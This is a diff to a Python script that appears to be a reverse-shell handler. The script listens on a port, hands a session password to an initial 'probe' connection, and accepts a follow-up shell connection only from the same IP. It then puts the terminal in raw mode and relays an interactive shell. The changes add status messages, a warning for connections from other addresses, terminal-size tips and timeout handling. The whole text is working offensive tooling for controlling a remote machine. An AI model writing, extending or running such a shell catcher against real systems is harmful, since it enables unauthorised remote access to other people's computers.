@@ -31,22 +31,32 @@ def main():
     shell_conn = None
     try:
         print(f"[*] Listening on {PORT}... (Timeout {TIMEOUT}s)")
+        
+        # 1. Capture the Probe
         probe_conn, addr = server.accept()
         authorized_ip = addr[0]
         
+        # Display probe acknowledgement exactly as requested
+        print(f"[*] Connection 1 (Probe) acknowledged from {authorized_ip}.")
+
         probe_conn.sendall(f"{session_pass}\n".encode())
         probe_conn.close() 
 
         server.settimeout(10)
         while True:
             shell_conn, addr = server.accept()
-            if addr[0] == authorized_ip: break
-            else: shell_conn.close()
+            if addr[0] == authorized_ip: 
+                break
+            else: 
+                # Alert if a ping comes from a different address than the probe
+                print(f"[!] Warning: Unauthorized ping from {addr[0]}. Dropping connection.")
+                shell_conn.close()
 
+        # 2. Display shell info exactly as requested
         rows, cols = get_term_size()
         print(f"[*] Shell established from {authorized_ip}")
-        print(f"[*] Local Terminal: {rows} rows, {cols} cols.")
-        print(f"[*] MANUAL FIX: Run 'stty rows {rows} cols {cols}' inside the shell.")
+        print(f"[*] Window size: {rows} rows, {cols} cols.")
+        print(f"[*] Tip: Run 'stty rows {rows} cols {cols}' inside the shell.")
 
         tty.setraw(fd)
         while True:
@@ -60,7 +70,10 @@ def main():
                 if not data: break
                 shell_conn.sendall(data)
 
-    except Exception as e: print(f"\n[!] Error: {e}")
+    except (socket.timeout, TimeoutError):
+        print("\n[!] Timeout reached: No response.")
+    except Exception as e: 
+        print(f"\n[!] Error: {e}")
     finally:
         termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
         if shell_conn: shell_conn.close()
